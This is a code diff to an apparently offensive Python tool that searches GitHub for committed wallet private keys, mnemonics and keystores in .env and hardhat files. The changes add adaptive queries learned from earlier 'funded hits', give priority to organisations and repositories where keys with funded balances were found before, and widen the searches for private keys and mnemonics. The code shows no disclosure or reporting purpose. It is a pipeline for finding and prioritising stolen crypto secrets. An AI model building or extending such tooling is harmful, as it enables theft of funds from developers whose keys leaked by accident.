@@ -104,6 +104,41 @@ P1_QUERIES = [
 ]
 
 
+def load_adaptive_queries():
+    """Merge success-atlas queries (from real funded hits) ahead of static P0/P1."""
+    p0 = list(P0_QUERIES)
+    p1 = list(P1_QUERIES)
+    aq_path = HOME / ".adaptive_queries.json"
+    boost_repos = []
+    boost_orgs = []
+    try:
+        if aq_path.exists():
+            data = json.loads(aq_path.read_text(encoding="utf-8"))
+            ap0 = [q for q in (data.get("p0") or []) if isinstance(q, str) and q.strip()]
+            ap1 = [q for q in (data.get("p1") or []) if isinstance(q, str) and q.strip()]
+            # Adaptive first, then static fillers not already present
+            seen = set()
+            merged_p0 = []
+            for q in ap0 + p0:
+                if q not in seen:
+                    seen.add(q)
+                    merged_p0.append(q)
+            merged_p1 = []
+            for q in ap1 + p1:
+                if q not in seen:
+                    seen.add(q)
+                    merged_p1.append(q)
+            p0, p1 = merged_p0, merged_p1
+            boost_repos = list(data.get("boost_repos") or [])
+            boost_orgs = list(data.get("boost_orgs") or [])
+            print(f"  [adapt] loaded {len(ap0)} p0 + {len(ap1)} p1 atlas queries, "
+                  f"{len(boost_repos)} boost repos, {len(boost_orgs)} orgs")
+    except Exception as e:
+        print(f"  [adapt] query load skipped: {e}")
+    return p0, p1, boost_repos, boost_orgs
+
+
+
 def utc_now() -> str:
     return datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")
 
@@ -343,15 +378,19 @@ def live_github_search(token: str, max_results: int = 300) -> List[Tuple[str, st
     found: Dict[str, float] = {}
     # Prefer recently pushed material via repo search (faster + more reliable than code search)
     since = (datetime.now(timezone.utc) - timedelta(days=90)).strftime("%Y-%m-%d")
-    # Tight P0 set only — speed > volume
-    queries = list(P0_QUERIES[:4])
+    # Adaptive queries from success atlas (funded eth/matic paths) + static fallbacks
+    adapt_p0, adapt_p1, boost_repos, boost_orgs = load_adaptive_queries()
+    queries = list(adapt_p0[:8])  # more adaptive code searches
 
     # 1) Repository search (works with basic token scopes, faster)
     repo_queries = [
         f"wallet filename:.env pushed:>{since}",
         f"PRIVATE_KEY filename:.env pushed:>{since}",
+        f"MNEMONIC filename:.env pushed:>{since}",
+        f"hardhat PRIVATE_KEY pushed:>{since}",
         "bip39 mnemonic",
         "ethereum keystore",
+        "peggy bridge wallet",
     ]
     for qi, q in enumerate(repo_queries):
         if len(found) >= max_results:
@@ -406,8 +445,10 @@ def live_github_search(token: str, max_results: int = 300) -> List[Tuple[str, st
         time.sleep(0.4)
 
     # Expand winning orgs: list their recently pushed repos
-    winners = load_winning_orgs()
-    for org in sorted(winners)[:15]:
+    winners = set(load_winning_orgs()) | set(boost_orgs or [])
+    # Prefer atlas orgs first
+    ordered_orgs = list(boost_orgs or []) + [o for o in sorted(winners) if o not in set(boost_orgs or [])]
+    for org in ordered_orgs[:20]:
         if len(found) >= max_results:
             break
         print(f"  [live] expand winning org: {org}", flush=True)
@@ -423,7 +464,32 @@ def live_github_search(token: str, max_results: int = 300) -> List[Tuple[str, st
                     found[html] = max(found.get(html, 0), 0.75)
         time.sleep(0.3)
 
+    # Force-include repos that previously attributed to funded balances
+    for html in (boost_repos or [])[:40]:
+        if html and not is_fake(html):
+            found[html] = max(found.get(html, 0), 0.98)
+    # Extra adaptive p1 code searches if headroom
+    for qi, q in enumerate(list(adapt_p1)[:6]):
+        if len(found) >= max_results:
+            break
+        print(f"  [live] adapt-p1 code-search [{qi+1}]: {q[:70]}", flush=True)
+        data = github_api_get(
+            "https://api.github.com/search/code",
+            token,
+            params={"q": q, "per_page": 20},
+        )
+        if not data:
+            time.sleep(0.3)
+            continue
+        for it in data.get("items") or []:
+            repo = (it.get("repository") or {})
+            full = repo.get("full_name") or ""
+            html = repo.get("html_url") or (f"https://github.com/{full}" if full else "")
+            if html and not is_fake(html):
+                found[html] = max(found.get(html, 0), 0.92)
+        time.sleep(0.4)
     return [("github", u, s) for u, s in found.items()]
+
 
 
 def mine_local_findings() -> List[Tuple[str, str, float]]:
